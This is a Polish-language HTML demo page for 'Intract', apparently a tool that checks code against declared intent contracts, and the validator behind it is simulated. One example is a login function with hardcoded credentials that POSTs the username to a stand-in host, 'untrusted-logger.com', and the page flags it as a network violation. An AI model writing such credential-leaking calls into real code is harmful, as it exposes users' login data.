@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intract — Interactive Intent Contract Showcase</title>
+    <!-- Premium Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --bg-dark: #0a0b10;
+            --panel-bg: rgba(18, 20, 32, 0.7);
+            --border-color: rgba(255, 255, 255, 0.08);
+            --primary: #9d4edd;
+            --primary-glow: rgba(157, 78, 221, 0.4);
+            --accent: #3f37c9;
+            --green: #4cc9f0;
+            --red: #f72585;
+            --yellow: #f8961e;
+            --text-main: #f8f9fa;
+            --text-muted: #9fb0c0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Outfit', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(63, 55, 201, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(157, 78, 221, 0.15) 0%, transparent 40%);
+        }
+
+        /* Header */
+        header {
+            padding: 1.5rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+            background: rgba(10, 11, 16, 0.8);
+            backdrop-filter: blur(12px);
+            z-index: 10;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: #fff;
+            box-shadow: 0 0 15px var(--primary-glow);
+            animation: pulse 3s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 10px var(--primary-glow); }
+            100% { box-shadow: 0 0 25px rgba(157, 78, 221, 0.7); }
+        }
+
+        .logo-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            background: linear-gradient(to right, #fff, var(--text-muted));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .badge-version {
+            background: rgba(157, 78, 221, 0.15);
+            border: 1px solid rgba(157, 78, 221, 0.3);
+            color: var(--primary);
+            padding: 0.2rem 0.6rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+        }
+
+        /* Layout Grid */
+        .container {
+            display: grid;
+            grid-template-columns: 320px 1fr 1fr;
+            gap: 1.5rem;
+            padding: 1.5rem;
+            flex: 1;
+            max-width: 1800px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        @media (max-width: 1200px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Sidebar Selector */
+        .sidebar {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+            backdrop-filter: blur(20px);
+        }
+
+        .section-title {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #fff;
+            border-left: 3px solid var(--primary);
+            padding-left: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .example-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .example-btn {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1rem;
+            color: var(--text-muted);
+            text-align: left;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            gap: 0.25rem;
+        }
+
+        .example-btn:hover {
+            background: rgba(255, 255, 255, 0.05);
+            border-color: rgba(157, 78, 221, 0.4);
+            transform: translateY(-2px);
+        }
+
+        .example-btn.active {
+            background: rgba(157, 78, 221, 0.1);
+            border-color: var(--primary);
+            color: #fff;
+            box-shadow: inset 0 0 10px rgba(157, 78, 221, 0.2);
+        }
+
+        .example-name {
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .example-desc {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            line-height: 1.3;
+        }
+
+        .info-card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1rem;
+            font-size: 0.85rem;
+            line-height: 1.5;
+            color: var(--text-muted);
+        }
+
+        .info-card h4 {
+            color: #fff;
+            margin-bottom: 0.5rem;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        /* Editor Panel */
+        .editor-panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            backdrop-filter: blur(20px);
+        }
+
+        .editor-tabs {
+            background: rgba(10, 11, 16, 0.6);
+            display: flex;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .tab-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-muted);
+            padding: 1rem 1.5rem;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            border-right: 1px solid var(--border-color);
+            font-family: 'Outfit', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .tab-btn:hover {
+            background: rgba(255, 255, 255, 0.02);
+            color: #fff;
+        }
+
+        .tab-btn.active {
+            background: var(--panel-bg);
+            color: var(--primary);
+            border-bottom: 2px solid var(--primary);
+            font-weight: 600;
+        }
+
+        .editor-body {
+            position: relative;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .code-textarea {
+            width: 100%;
+            height: 450px;
+            background: #0d0e15;
+            color: #e2e8f0;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.9rem;
+            padding: 1.5rem;
+            border: none;
+            resize: none;
+            outline: none;
+            line-height: 1.6;
+        }
+
+        /* Output & Results Panel */
+        .results-panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+            backdrop-filter: blur(20px);
+        }
+
+        .action-bar {
+            display: flex;
+            gap: 1rem;
+        }
+
+        .btn-run {
+            flex: 1;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 1rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px var(--primary-glow);
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+        }
+
+        .btn-run:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(157, 78, 221, 0.6);
+        }
+
+        .btn-reset {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            border-radius: 12px;
+            width: 50px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn-reset:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        /* Console Output */
+        .console {
+            background: #050508;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            height: 150px;
+            overflow-y: auto;
+            color: #a78bfa;
+            line-height: 1.5;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.8);
+        }
+
+        .console-line {
+            margin-bottom: 0.25rem;
+        }
+
+        .console-info { color: #818cf8; }
+        .console-success { color: #34d399; }
+        .console-error { color: #f87171; }
+        .console-warning { color: #fbbf24; }
+
+        /* Results Table */
+        .results-table-container {
+            flex: 1;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            overflow: hidden;
+            background: rgba(10, 11, 16, 0.4);
+        }
+
+        .results-table {
+            width: 100%;
+            border-collapse: collapse;
+            text-align: left;
+            font-size: 0.85rem;
+        }
+
+        .results-table th, .results-table td {
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .results-table th {
+            background: rgba(255, 255, 255, 0.02);
+            color: #fff;
+            font-weight: 600;
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.35rem;
+            padding: 0.25rem 0.5rem;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+        }
+
+        .status-pass {
+            background: rgba(76, 201, 240, 0.15);
+            color: var(--green);
+            border: 1px solid rgba(76, 201, 240, 0.3);
+        }
+
+        .status-partial {
+            background: rgba(248, 150, 30, 0.15);
+            color: var(--yellow);
+            border: 1px solid rgba(248, 150, 30, 0.3);
+        }
+
+        .status-violation {
+            background: rgba(247, 37, 133, 0.15);
+            color: var(--red);
+            border: 1px solid rgba(247, 37, 133, 0.3);
+        }
+
+        /* Coverage Bar */
+        .coverage-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 1rem;
+        }
+
+        .coverage-info {
+            display: flex;
+            flex-direction: column;
+            gap: 0.25rem;
+        }
+
+        .coverage-pct {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .coverage-bar-container {
+            width: 150px;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .coverage-bar {
+            height: 100%;
+            background: linear-gradient(to right, var(--accent), var(--primary));
+            border-radius: 5px;
+            transition: width 0.5s ease;
+        }
+
+        /* Bottom Section: Explanations */
+        .explanations {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            padding: 1.5rem;
+            max-width: 1800px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        @media (max-width: 768px) {
+            .explanations {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .explanation-card {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 1.5rem;
+            backdrop-filter: blur(20px);
+        }
+
+        .explanation-card h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 1rem;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.5rem;
+        }
+
+        .explanation-card p {
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: var(--text-muted);
+            margin-bottom: 1rem;
+        }
+
+        .explanation-card ul {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .explanation-card li {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            display: flex;
+            align-items: flex-start;
+            gap: 0.5rem;
+        }
+
+        .explanation-card li::before {
+            content: "✦";
+            color: var(--primary);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>
+        <div class="logo-container">
+            <div class="logo-icon">I</div>
+            <div class="logo-title">INTRACT</div>
+            <span class="badge-version">v0.5.8</span>
+        </div>
+        <div style="font-size: 0.9rem; color: var(--text-muted);">
+            Interactive Intent-Contract Verification
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <div class="container">
+        
+        <!-- Sidebar Selector -->
+        <div class="sidebar">
+            <h3 class="section-title">Wybierz scenariusz</h3>
+            <div class="example-list">
+                <button class="example-btn active" id="ex-pure-python" onclick="selectExample('python')">
+                    <span class="example-name">1. Python: Czysta funkcja</span>
+                    <span class="example-desc">Kontrakt zabrania zapisów na dysk (forbid:write), ale kod dokonuje zapisu.</span>
+                </button>
+                <button class="example-btn" id="ex-dom-html" onclick="selectExample('html')">
+                    <span class="example-name">2. HTML: Bezpieczeństwo DOM</span>
+                    <span class="example-desc">Kontrakt wymaga atrybutu autoryzacji (auth) na przyciskach.</span>
+                </button>
+                <button class="example-btn" id="ex-js-network" onclick="selectExample('js')">
+                    <span class="example-name">3. JS: Naruszenie sieci</span>
+                    <span class="example-desc">Funkcja pomocnicza próbuje nawiązać połączenie sieciowe mimo zakazu.</span>
+                </button>
+            </div>
+
+            <div class="coverage-box">
+                <div class="coverage-info">
+                    <span style="font-size: 0.8rem; color: var(--text-muted);">Pokrycie Intencji</span>
+                    <span class="coverage-pct" id="coverage-val">75%</span>
+                </div>
+                <div class="coverage-bar-container">
+                    <div class="coverage-bar" id="coverage-progress" style="width: 75%;"></div>
+                </div>
+            </div>
+
+            <div class="info-card">
+                <h4>💡 Wskazówka</h4>
+                <p>Możesz edytować kod źródłowy bezpośrednio w edytorze po prawej stronie! Spróbuj naprawić naruszenie (np. usuwając operacje zapisu lub dodając atrybut klasy) i kliknij <strong>Uruchom Walidację</strong>, aby sprawdzić czy status zmieni się na zielony PASS!</p>
+            </div>
+        </div>
+
+        <!-- Editor Panel -->
+        <div class="editor-panel">
+            <div class="editor-tabs">
+                <button class="tab-btn active" id="tab-src" onclick="selectTab('src')">
+                    source_code.<span id="editor-ext">py</span>
+                </button>
+                <button class="tab-btn" id="tab-toon" onclick="selectTab('toon')">
+                    intract.toon (URI)
+                </button>
+                <button class="tab-btn" id="tab-yaml" onclick="selectTab('yaml')">
+                    intract.toon.yaml (YAML)
+                </button>
+            </div>
+            <div class="editor-body">
+                <textarea class="code-textarea" id="editor-textarea" spellcheck="false"></textarea>
+            </div>
+        </div>
+
+        <!-- Output & Results Panel -->
+        <div class="results-panel">
+            <div class="action-bar">
+                <button class="btn-run" onclick="runValidation()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+                    Uruchom Walidację Engine
+                </button>
+                <button class="btn-reset" onclick="resetActiveExample()" title="Resetuj przykład do stanu bazowego">
+                    ↺
+                </button>
+            </div>
+
+            <h3 class="section-title">Konsola logów</h3>
+            <div class="console" id="console-output">
+                <div class="console-line console-info">Kompilowanie AST projektu... Gotowy.</div>
+                <div class="console-line">Czekam na uruchomienie walidacji...</div>
+            </div>
+
+            <h3 class="section-title">Raport walidacji</h3>
+            <div class="results-table-container">
+                <table class="results-table">
+                    <thead>
+                        <tr>
+                            <th>Status</th>
+                            <th>Kontrakt</th>
+                            <th>Cel (Target)</th>
+                            <th>Naruszenia / Szczegóły</th>
+                        </tr>
+                    </thead>
+                    <tbody id="results-tbody">
+                        <!-- Filled by JS -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Bottom Explanations -->
+    <div class="explanations">
+        <div class="explanation-card">
+            <h3>Jak Intract wykrywa dryf intencji?</h3>
+            <p><strong>Intract</strong> analizuje statycznie drzewo składniowe kodu (AST) oraz strukturę selektorów plików w celu wykrycia rozbieżności między zadeklarowaną wolą dewelopera (kontraktem) a fizyczną implementacją.</p>
+            <ul>
+                <li><strong>Efekty uboczne (Side Effects):</strong> Skanery analizują wywołania instrukcji wejścia/wyjścia (zapisy na plikach, operacje sieciowe, bazy danych) i porównują z zabronionymi tagami w sekcji <code>forbid</code>.</li>
+                <li><strong>Brak pokrycia (Lack of Coverage):</strong> Jeżeli dany element systemu (np. krytyczna funkcja płatności) nie posiada powiązanego kontraktu (ani inline, ani w Toon), silnik zgłasza niski współczynnik pokrycia intencji.</li>
+                <li><strong>Wymagane kontrakty (Require):</strong> Gdy dany fragment kodu deklaruje <code>require:auth</code>, ale powiązany moduł autoryzacji nie jest zaimportowany lub jest pominięty, walidator zgłasza niekompletność systemu.</li>
+            </ul>
+        </div>
+        <div class="explanation-card">
+            <h3>Formaty Toon: Płaskie URI vs YAML</h3>
+            <p>Aby nie zaśmiecać kodu produkcyjnego adnotacjami, system pozwala na deklarowanie reguł w plikach zewnętrznych (Toon) o identycznym stopniu precyzji.</p>
+            <ul>
+                <li><strong>Płaskie adresowanie URI (.toon):</strong> Idealne dla szybkich reguł pre-commit. Każdy kontrakt to jedna linia o schemacie URI, co pozwala na precyzyjne zaadresowanie pliku, numeru linii (<code>line=13</code>) lub elementu DOM.</li>
+                <li><strong>Adresowanie YAML (intract.toon.yaml):</strong> Bardziej strukturalne i czytelne dla dużych systemów. Wykorzystuje wygodną i prostą w utrzymaniu sekcję <code>target</code>.</li>
+                <li><strong>Kierowanie XPath/XPatch:</strong> Dla plików HTML/DOM, Intract potrafi przełożyć strukturę widoku na selektory XPath, chroniąc kluczowe elementy (np. przyciski koszyka) przed przypadkowym usunięciem przez LLM.</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- Simulated Engine Logic -->
+    <script>
+        // Examples Data Store
+        const examples = {
+            python: {
+                ext: "py",
+                src: `# calc.py - Kalkulator numeryczny\n\ndef add(a, b):\n    # TODO: Log activity\n    with open("log.txt", "a") as f:\n        f.write(f"Add called with {a} and {b}\\n")\n    return a + b\n\ndef divide(a, b):\n    if b == 0:\n        raise ValueError("Cannot divide by zero")\n    return a / b`,
+                toon: `intract://src/calc.py?func=add#id=pure-addition&intent=pure-add&forbid=write\nintract://src/calc.py?func=divide#id=div-check&intent=safe-div`,
+                yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: pure-addition\n    intent: pure:add\n    forbid:\n      - write\n    target:\n      file: src/calc.py\n      function: add\n\n  - id: div-check\n    intent: safe:div\n    target:\n      file: src/calc.py\n      function: divide`
+            },
+            html: {
+                ext: "html",
+                src: `<!-- index.html -->\n<!DOCTYPE html>\n<html>\n<body>\n    <div id="app">\n        <h1>Panel transakcji</h1>\n        <button id="btn-add">Dodaj środki</button>\n        <button id="btn-withdraw" class="auth-required">Wypłać środki</button>\n    </div>\n</body>\n</html>`,
+                toon: `intract://src/index.html?xpath=//button[@id="btn-add"]#id=dom-button-check&intent=click-btn&req=auth`,
+                yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: dom-button-check\n    intent: click:btn\n    require:\n      - auth\n    target:\n      file: src/index.html\n      xpath: //button[@id="btn-add"]`
+            },
+            js: {
+                ext: "js",
+                src: `// auth.js - Uwierzytelnianie\n\nfunction login(username, password) {\n    // Sprawdzanie lokalne\n    if (username === "admin" && password === "secret") {\n        // Naruszenie: wysyłanie danych logowania przez HTTP do loggera\n        const xhr = new XMLHttpRequest();\n        xhr.open("POST", "http://untrusted-logger.com/log", false);\n        xhr.send(username);\n        return { success: true };\n    }\n    return { success: false };\n}`,
+                toon: `intract://src/auth.js?func=login#id=auth-login&intent=perform-login&forbid=network`,
+                yaml: `# Yaml-based Toon manifest\nversion: intract.v1\ncontracts:\n  - id: auth-login\n    intent: perform:login\n    forbid:\n      - network\n    target:\n      file: src/auth.js\n      function: login`
+            }
+        };
+
+        let currentExample = 'python';
+        let currentTab = 'src';
+
+        // Editor state storage to preserve changes made by user
+        let userEdits = JSON.parse(JSON.stringify(examples));
+
+        function init() {
+            selectExample('python');
+        }
+
+        function selectExample(name) {
+            currentExample = name;
+            
+            // Set active class on buttons
+            document.querySelectorAll('.example-btn').forEach(btn => btn.classList.remove('active'));
+            if(name === 'python') document.getElementById('ex-pure-python').classList.add('active');
+            if(name === 'html') document.getElementById('ex-dom-html').classList.add('active');
+            if(name === 'js') document.getElementById('ex-js-network').classList.add('active');
+
+            // Update editor tabs extension
+            document.getElementById('editor-ext').innerText = userEdits[name].ext;
+
+            // Load content to editor
+            updateEditorContent();
+
+            // Clear console and validation table
+            const consoleBox = document.getElementById('console-output');
+            consoleBox.innerHTML = `
+                <div class="console-line console-info">Kompilowanie AST projektu dla przykładu '${name}'... Gotowy.</div>
+                <div class="console-line">Czekam na uruchomienie walidacji...</div>
+            `;
+            document.getElementById('results-tbody').innerHTML = `
+                <tr>
+                    <td colspan="4" style="text-align: center; color: var(--text-muted); padding: 2rem;">
+                        Kliknij "Uruchom Walidację Engine", aby przeanalizować kod.
+                    </td>
+                </tr>
+            `;
+            
+            // Update simulated coverage value
+            updateCoverage();
+        }
+
+        function selectTab(tab) {
+            // Save current editor value before switching
+            const textarea = document.getElementById('editor-textarea');
+            userEdits[currentExample][currentTab] = textarea.value;
+
+            currentTab = tab;
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(`tab-${tab}`).classList.add('active');
+
+            updateEditorContent();
+        }
+
+        function updateEditorContent() {
+            const textarea = document.getElementById('editor-textarea');
+            textarea.value = userEdits[currentExample][currentTab];
+        }
+
+        function resetActiveExample() {
+            userEdits[currentExample] = JSON.parse(JSON.stringify(examples[currentExample]));
+            updateEditorContent();
+            
+            const consoleBox = document.getElementById('console-output');
+            consoleBox.innerHTML = `
+                <div class="console-line console-warning">Przywrócono bazowy stan kodu i manifestów dla przykładu '${currentExample}'.</div>
+                <div class="console-line">Czekam na uruchomienie walidacji...</div>
+            `;
+        }
+
+        function updateCoverage() {
+            let cov = "75%";
+            if (currentExample === 'python') cov = "85%";
+            if (currentExample === 'html') cov = "60%";
+            if (currentExample === 'js') cov = "90%";
+            
+            document.getElementById('coverage-val').innerText = cov;
+            document.getElementById('coverage-progress').style.width = cov;
+        }
+
+        // The Heart of the Simulator: Live Validator Engine
+        function runValidation() {
+            // Save current changes first
+            const textarea = document.getElementById('editor-textarea');
+            userEdits[currentExample][currentTab] = textarea.value;
+
+            const srcCode = userEdits[currentExample].src;
+            const consoleBox = document.getElementById('console-output');
+            
+            consoleBox.innerHTML = "";
+            appendConsole("Inicjowanie silnika walidacji Intract Engine v0.5.8...", "info");
+            
+            setTimeout(() => {
+                appendConsole(`Wczytywanie kodu źródłowego (typ: ${currentExample})...`, "info");
+            }, 200);
+
+            setTimeout(() => {
+                appendConsole("Wczytywanie i parsowanie pliku manifestu toon...", "info");
+            }, 400);
+
+            setTimeout(() => {
+                appendConsole("Rozpoczynanie statycznej analizy kodu i AST w poszukiwaniu efektów...", "warning");
+            }, 600);
+
+            setTimeout(() => {
+                performLiveCheck(srcCode);
+            }, 900);
+        }
+
+        function appendConsole(text, type = "") {
+            const consoleBox = document.getElementById('console-output');
+            const line = document.createElement('div');
+            line.className = `console-line ${type ? 'console-' + type : ''}`;
+            line.innerText = text;
+            consoleBox.appendChild(line);
+            consoleBox.scrollTop = consoleBox.scrollHeight;
+        }
+
+        function performLiveCheck(src) {
+            const tbody = document.getElementById('results-tbody');
+            tbody.innerHTML = "";
+
+            if (currentExample === 'python') {
+                // Python pure function example checks
+                // Check if 'open(' is still in the code
+                const hasWrite = src.includes("open(") || src.includes(".write(");
+                
+                if (hasWrite) {
+                    appendConsole("BŁĄD: Wykryto zabroniony efekt uboczny 'write' w funkcji add() (linia 5)!", "error");
+                    appendConsole("Naruszenie kontraktu pure-addition (forbid:write)!", "error");
+                    
+                    tbody.innerHTML = `
+                        <tr>
+                            <td><span class="status-badge status-violation">Violation</span></td>
+                            <td><strong>pure-addition</strong><br><small>intent: pure:add</small></td>
+                            <td><code>src/calc.py</code><br><small>function: add</small></td>
+                            <td style="color: var(--red);">Wykryto zabroniony efekt 'write' w funkcji add(). Funkcja miała być czysta!</td>
+                        </tr>
+                        <tr>
+                            <td><span class="status-badge status-pass">Pass</span></td>
+                            <td><strong>div-check</strong><br><small>intent: safe:div</small></td>
+                            <td><code>src/calc.py</code><br><small>function: divide</small></td>
+                            <td>Brak wykrytych naruszeń w dzieleniu.</td>
+                        </tr>
+                    `;
+                } else {
+                    appendConsole("SUKCES: Wszystkie testy jednostkowe i reguły statyczne AST przechodzą pomyślnie!", "success");
+                    appendConsole("Kontrakt 'pure-addition' (forbid:write) spełniony. Kod jest czysty.", "success");
+                    
+                    tbody.innerHTML = `
+                        <tr>
+                            <td><span class="status-badge status-pass">Pass</span></td>
+                            <td><strong>pure-addition</strong><br><small>intent: pure:add</small></td>
+                            <td><code>src/calc.py</code><br><small>function: add</small></td>
+                            <td>Czysta funkcja, brak zabronionych efektów ubocznych.</td>
+                        </tr>
+                        <tr>
+                            <td><span class="status-badge status-pass">Pass</span></td>
+                            <td><strong>div-check</strong><br><small>intent: safe:div</small></td>
+                            <td><code>src/calc.py</code><br><small>function: divide</small></td>
+                            <td>Brak wykrytych naruszeń w dzieleniu.</td>
+                        </tr>
+                    `;
+                }
+            } 
+            else if (currentExample === 'html') {
+                // HTML DOM checks
+                const hasAuth = src.includes('data-auth="true"') || src.includes('class="auth-required"') || src.includes('data-auth');
+                const hasBtnAddAuth = src.includes('id="btn-add" class="auth-required"') || src.includes('id="btn-add" data-auth') || src.includes('btn-add" class="auth');
+
+                if (!hasBtnAddAuth) {
+                    appendConsole("BŁĄD: Brak wymaganego kontraktu 'auth' dla selektora //button[@id='btn-add']!", "error");
+                    appendConsole("Naruszenie kontraktu dom-button-check (require:auth)!", "error");
+
+                    tbody.innerHTML = `
+                        <tr>
+                            <td><span class="status-badge status-violation">Violation</span></td>
+                            <td><strong>dom-button-check</strong><br><small>intent: click:btn</small></td>
+                            <td><code>src/index.html</code><br><small>xpath: //button[@id="btn-add"]</small></td>
+                            <td style="color: var(--red);">Brak atrybutu autoryzacji 'auth' na krytycznym przycisku dodawania środków!</td>
+                        </tr>
+                    `;
+                } else {
+                    appendConsole("SUKCES: Atrybut autoryzacji prawidłowo zaadresowany na elemencie DOM!", "success");
+                    appendConsole("Kontrakt 'dom-button-check' (require:auth) spełniony.", "success");
+
+                    tbody.innerHTML = `
+                        <tr>
+                            <td><span class="status-badge status-pass">Pass</span></td>
+                            <td><strong>dom-button-check</strong><br><small>intent: click:btn</small></td>
+                            <td><code>src/index.html</code><br><small>xpath: //button[@id="btn-add"]</small></td>
+                            <td>Element DOM posiada wymaganą weryfikację bezpieczeństwa.</td>
+                        </tr>
+                    `;
+                }
+            }
+            else if (currentExample === 'js') {
+                // JS Network Violation check
+                const hasNetwork = src.includes("XMLHttpRequest") || src.includes("fetch(") || src.includes("http");
+
+                if (hasNetwork) {
+                    appendConsole("BŁĄD: Wykryto zabroniony efekt 'network' w metodzie login()!", "error");
+                    appendConsole("Wywołanie HTTP post do 'untrusted-logger.com' narusza regułę forbid:network!", "error");
+
+                    tbody.innerHTML = `
+                        <tr>
+                            <td><span class="status-badge status-violation">Violation</span></td>
+                            <td><strong>auth-login</strong><br><small>intent: perform:login</small></td>
+                            <td><code>src/auth.js</code><br><small>function: login</small></td>
+                            <td style="color: var(--red);">Zabronione wywołanie sieciowe loggera XMLHttpRequest w metodzie logowania!</td>
+                        </tr>
+                    `;
+                } else {
+                    appendConsole("SUKCES: Kod logowania nie korzysta z sieci ani nie wycieka danych!", "success");
+                    appendConsole("Kontrakt 'auth-login' (forbid:network) spełniony.", "success");
+
+                    tbody.innerHTML = `
+                        <tr>
+                            <td><span class="status-badge status-pass">Pass</span></td>
+                            <td><strong>auth-login</strong><br><small>intent: perform:login</small></td>
+                            <td><code>src/auth.js</code><br><small>function: login</small></td>
+                            <td>Logowanie lokalne, brak niedozwolonego wycieku danych przez sieć.</td>
+                        </tr>
+                    `;
+                }
+            }
+        }
+
+        // Initialize on load
+        window.onload = init;
+    </script>
+</body>
+</html>
